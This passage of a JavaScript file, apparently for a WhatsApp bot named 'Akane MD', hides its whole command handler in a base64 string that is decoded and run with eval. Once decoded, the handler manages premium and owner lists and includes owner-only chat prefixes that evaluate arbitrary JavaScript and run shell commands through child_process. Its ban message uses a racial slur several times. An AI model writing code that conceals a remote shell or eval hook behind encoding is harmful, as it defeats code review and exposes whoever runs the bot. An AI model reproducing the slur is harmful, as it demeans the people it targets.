mVyLnNwbGljZShvd25lci5pbmRleE9mKG51bWJlciksIDEpOwogICAgUHJlbWl1bS5zcGxpY2UoUHJlbWl1bS5pbmRleE9mKG51bWJlciksIDEpOwoKICAgIGZzLndyaXRlRmlsZVN5bmMoJy4vc3lzdGVtL293bmVyLmpzb24nLCBKU09OLnN0cmluZ2lmeShvd25lcikpOwogICAgZnMud3JpdGVGaWxlU3luYygnLi9zeXN0ZW0vcHJlbWl1bS5qc29uJywgSlNPTi5zdHJpbmdpZnkoUHJlbWl1bSkpOwoKICAgIG0ucmVwbHkoIk93bmVyIHJlbW92ZWQgc3VjY2Vzc2Z1bGx5LiIpOwp9CmJyZWFrOwpjYXNlICJ0ZXN0IjoKICAgICAgICB7CiAgICAgICAgICByZXBseSgiYGBgYWN0aXZlIPCfgIRgYGAiKTsKICAgICAgICB9CiAgICAgICAgYnJlYWs7CmNhc2UgJ2FkZHByZW1pdW0nOiBjYXNlICdhZGRwcmVtJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgIGlmICghaXNDcmVhdG9yKSByZXR1cm4gbS5yZXBseSgiZm9yIE93bmVyIG9ubHkhIik7CiAgICBpZiAoIWFyZ3NbMF0pIHJldHVybiBtLnJlcGx5KGBVc2FnZTogJHtwcmVmaXggKyBjb21tYW5kfSAyMzR4eHhgKTsKCiAgICBsZXQgbnVtYmVyID0gcXRleHQuc3BsaXQoInwiKVswXS5yZXBsYWNlKC9bXjAtOV0vZywgJycpOwogICAgbGV0IGNla251bSA9IGF3YWl0IHJpY2gub25XaGF0c0FwcChudW1iZXIgKyAiQHMud2hhdHNhcHAubmV0Iik7CiAgICBpZiAoIWNla251bS5sZW5ndGgpIHJldHVybiBtLnJlcGx5KCJJbnZhbGlkIG51bWJlciEiKTsKCiAgICBQcmVtaXVtLnB1c2gobnVtYmVyKTsKICAgIGZzLndyaXRlRmlsZVN5bmMoJy4uL3N5c3RlbS9wcmVtaXVtLmpzb24nLCBKU09OLnN0cmluZ2lmeShQcmVtaXVtKSk7CgogICAgbS5yZXBseSgiU3VjY2VzcyEgVXNlciBhZGRlZCB0byBwcmVtaXVtLiIpOwp9CmJyZWFrOwpjYXNlICdkZWxwcmVtaXVtJzogY2FzZSAnZGVscHJlbSc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICBpZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoImZvciBPd25lciBvbmx5ISIpOwogICAgaWYgKCFhcmdzWzBdKSByZXR1cm4gbS5yZXBseShgVXNhZ2U6ICR7cHJlZml4ICsgY29tbWFuZH0gMjM0eHh4YCk7CgogICAgbGV0IG51bWJlciA9IHF0ZXh0LnNwbGl0KCJ8IilbMF0ucmVwbGFjZSgvW14wLTldL2csICcnKTsKICAgIGxldCBpbmRleFByZW1pdW0gPSBQcmVtaXVtLmluZGV4T2YobnVtYmVyKTsKCiAgICBpZiAoaW5kZXhQcmVtaXVtICE9PSAtMSkgewogICAgICAgIFByZW1pdW0uc3BsaWNlKGluZGV4UHJlbWl1bSwgMSk7CiAgICAgICAgZnMud3JpdGVGaWxlU3luYygnLi4vc3lzdGVtL3ByZW1pdW0uanNvbicsIEpTT04uc3RyaW5naWZ5KFByZW1pdW0pKTsKICAgICAgICBtLnJlcGx5KCJTdWNjZXNzISBVc2VyIHJlbW92ZWQgZnJvbSBwcmVtaXVtLiIpOwogICAgfSBlbHNlIHsKICAgICAgICBtLnJlcGx5KCJVc2VyIGlzIG5vdCBpbiB0aGUgcHJlbWl1bSBsaXN0LiIpOwogICAgfQp9CmJyZWFrOwpjYXNlICdwdWJsaWMnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgaWYgKCFpc0NyZWF0b3IpIHJldHVybiBtLnJlcGx5KCJgYGBmb3IgT3duZXIgb25seWBgYC4iKTsKICAgIHJpY2gucHVibGljID0gdHJ1ZTsKICAgIG0ucmVwbHkoIl8qQUtBTkUgTUQgSVMgTk9XIE9OIFBVQkxJQyBNT0RFKl8iKTsKfQpicmVhazsKY2FzZSAncHJpdmF0ZSc6IGNhc2UgJ3NlbGYnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgaWYgKCFpc0NyZWF0b3IpIHJldHVybiBtLnJlcGx5KCJgYGBmb3IgT3duZXIgb25seWBgYC4iKTsKICAgIHJpY2gucHVibGljID0gZmFsc2U7CiAgICBtLnJlcGx5KCJfKkFLQU5FIE1EIElTIE5PVyBPTiBQUklWQVRFIE1PREUqXyIpOwp9CmJyZWFrOwpjYXNlICdzcGVlZHRlc3QnOiBjYXNlICdzcGVlZCc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmxldCB0aW1lc3RhbXAgPSBzcGVlZCgpCmxldCBsYXRlbnNpID0gc3BlZWQoKSAtIHRpbWVzdGFtcAogICAgICAgICByZXBseSAoYOKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgVxuXOKXiSDwnZm38J2ZtPCdmbvwnZm78J2ZviAke20ucHVzaE5hbWV9XG5c4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBXG5c4peIIGFrYW5lIHPijbThpbHhpbHhg6sgICA6ICR7bGF0ZW5zaS50b0ZpeGVkKDQpfSDwnZCM8J2QklxuXOKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgWApOyAKfQpicmVhawpjYXNlICdwaW5nJzogewogaWYgKGlzYmFuKSByZXR1cm4gbS5yZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgIEJPVCBOSUdHQSDwn6ShJyk7CiAgICBjb25zdCBzdGFydCA9IERhdGUubm93KCk7IC8vIFN0YXJ0IHRpbWUgZm9yIGxhdGVuY3kgY2FsY3VsYXRpb24KCiAgICB0cnkgewogICAgICAgIC8vIFNlbmQgaW5pdGlhbCAiUGluZ2luZy4uLiIgbWVzc2FnZQogICAgICAgIGxldCBzZW50TWVzc2FnZSA9IGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IAogICAgICAgICAgICB0ZXh0OiAncmVhZGluZy4uLicsIAogICAgICAgICAgICBxdW90ZWQ6IG0gCiAgICAgICAgfSk7CgogICAgICAgIC8vIENhbGN1bGF0ZSBsYXRlbmN5CiAgICAgICAgY29uc3QgcGluZyA9IERhdGUubm93KCkgLSBzdGFydDsKCiAgICAgICAgLy8gRGVsYXkgZm9yIGEgbW9yZSBuYXR1cmFsIGZlZWwgKDEuNXMpCiAgICAgICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDE1MDApKTsKCiAgICAgICAgLy8gRWRpdCB0aGUgb3JpZ2luYWwgbWVzc2FnZSBpbnN0ZWFkIG9mIHNlbmRpbmcgYSBuZXcgb25lCiAgICAgICAgaWYgKHNlbnRNZXNzYWdlPy5rZXkpIHsgCiAgICAgICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IAogICAgICAgICAgICAgICAgZWRpdDogc2VudE1lc3NhZ2Uua2V5LCAKICAgICAgICAgICAgICAgIHRleHQ6IGBcYFBvbmfwn5SrXGBcbiAqTGF0ZW5jeToqICR7cGluZ30gKm1zKiBgIAogICAgICAgICAgICB9KTsKICAgICAgICB9CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoJ+KdjCBFcnJvciBpbiBwaW5nIGNvbW1hbmQ6JywgZXJyb3IpOwogICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IAogICAgICAgICAgICB0ZXh0OiBg4p2MICpFcnJvcjoqICR7ZXJyb3IubWVzc2FnZX1gLCAKICAgICAgICAgICAgcXVvdGVkOiBtIAogICAgICAgIH0pOwogICAgfQogICAgYnJlYWs7Cn0KY2FzZSAncnVudGltZSc6IGNhc2UgJ2FsaXZlJzogeyAKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICAgICAgIHJlcGx5KGDil4hBa2FuZSBtZCBpcyBhY3RpdmUgXG4gc+KNtOGlseGlseGDq1xuIDogJHtydW50aW1lKHByb2Nlc3MudXB0aW1lKCkpfSBgKTsgCn0KYnJlYWsKCmRlZmF1bHQ6CmlmIChidWR5LnN0YXJ0c1dpdGgoJzwnKSkgewppZiAoIWlzQ3JlYXRvcikgcmV0dXJuOwpmdW5jdGlvbiBSZXR1cm4oc3VsKSB7CnNhdCA9IEpTT04uc3RyaW5naWZ5KHN1bCwgbnVsbCwgMikKYmFuZyA9IHV0aWwuZm9ybWF0KHNhdCkKaWYgKHNhdCA9PSB1bmRlZmluZWQpIHsKYmFuZyA9IHV0aWwuZm9ybWF0KHN1bCl9CnJldHVybiBtLnJlcGx5KGJhbmcpfQp0cnkgewptLnJlcGx5KHV0aWwuZm9ybWF0KGV2YWwoYChhc3luYyAoKSA9PiB7IHJldHVybiAke2J1ZHkuc2xpY2UoMyl9IH0pKClgKSkpCn0gY2F0Y2ggKGUpIHsKbS5yZXBseShTdHJpbmcoZSkpfX0KaWYgKGJ1ZHkuc3RhcnRzV2l0aCgnPicpKSB7CmlmICghaXNDcmVhdG9yKSByZXR1cm47CnRyeSB7CmxldCBldmFsZWQgPSBhd2FpdCBldmFsKGJ1ZHkuc2xpY2UoMikpCmlmICh0eXBlb2YgZXZhbGVkICE9PSAnc3RyaW5nJykgZXZhbGVkID0gcmVxdWlyZSgndXRpbCcpLmluc3BlY3QoZXZhbGVkKQphd2FpdCBtLnJlcGx5KGV2YWxlZCkKfSBjYXRjaCAoZXJyKSB7CmF3YWl0IG0ucmVwbHkoU3RyaW5nKGVycikpCn0KfQppZiAoYnVkeS5zdGFydHNXaXRoKCckJykpIHsKaWYgKCFpc0NyZWF0b3IpIHJldHVybjsKcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoYnVkeS5zbGljZSgyKSwgKGVyciwgc3Rkb3V0KSA9PiB7CmlmIChlcnIpIHJldHVybiBtLnJlcGx5KGAke2Vycn1gKQppZiAoc3Rkb3V0KSByZXR1cm4gbS5yZXBseShzdGRvdXQpCn0pCn0KfQp9IGNhdGNoIChlcnIpIHsKY29uc29sZS5sb2cocmVxdWlyZSgidXRpbCIpLmZvcm1hdChlcnIpKTsKfQp9CmxldCBmaWxlID0gcmVxdWlyZS5yZXNvbHZlKF9fZmlsZW5hbWUpCnJlcXVpcmUoJ2ZzJykud2F0Y2hGaWxlKGZpbGUsICgpID0+IHsKcmVxdWlyZSgnZnMnKS51bndhdGNoRmlsZShmaWxlKQpjb25zb2xlLmxvZygnXHgxYlswOzMybScrX19maWxlbmFtZSsnIFx4MWJbMTszMm11cGRhdGVkIVx4MWJbMG0nKQpkZWxldGUgcmVxdWlyZS5jYWNoZVtmaWxlXQpyZXF1aXJlKGZpbGUpCn0p", "base64").toString("utf-8");
eval(decoded);
